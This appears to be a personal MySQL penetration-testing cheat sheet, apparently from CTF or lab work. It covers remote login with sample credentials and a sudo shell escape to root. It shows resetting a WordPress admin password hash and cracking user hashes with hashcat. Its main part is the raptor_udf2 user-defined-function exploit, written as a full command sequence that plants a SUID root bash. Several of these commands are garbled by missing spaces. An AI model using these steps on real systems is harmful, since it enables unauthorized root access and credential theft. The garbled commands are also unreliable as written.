## REMOTE LOGIN:

• mysql -u root -proot -h 192.168.142.16 -P 3306  
• sudo mysql -u root -pLetMeIn123 -e '\!/bin/sh' (suid/sudotoroot)

## UPDATING WORDPRESS PASSWORD:

• Generate MD5hash - https://www.md5hashgenerator.com/  
```
update wp_users set user_pass="5f4dcc3b5aa765d61d8327deb882cf99" where id=1; (refer sunset-midnight walkthrough if doubt)
```
## UDF EXPLOIT: (Can be used for LPE)

MySQL 4.x/5.0 (Linux) - User-Defined Function Dynamic Library

```
gcc-g-craptor_udf2.c-fPIC
    
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    
mysql -u root
    
use mysql;
    
create table foo(lineblob);
    
insert into foo values(load_file('/home/raptor_udf2.so'));
    
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    
create function do_system returns integer soname 'raptor_udf2.so';
    
select do_system('cp/bin/bash/tmp/rootbash; chmod +xs/tmp/rootbash');
    
exit
    
user@target$ /tmp/rootbash -p
```
Note: In some scenarios for the above thing to work we might need to edit /etc/mysql/mariadb.conf.d/50-server.cnf and /etc/mysql/my.cnf and change user= whatever name to root.
## Find Hash of Users and Crack using Hashcat 
```
show databases;  
use <database>;  
show tables;
select * from <tablename>; 
describe <table_name>;  
show columns from<table>;
```
hashcat hash.txt rockyou.txt
```
select version(); (version)  
select @@version(); (version)  
select user(); (User) 
select database(); (databasename)
```

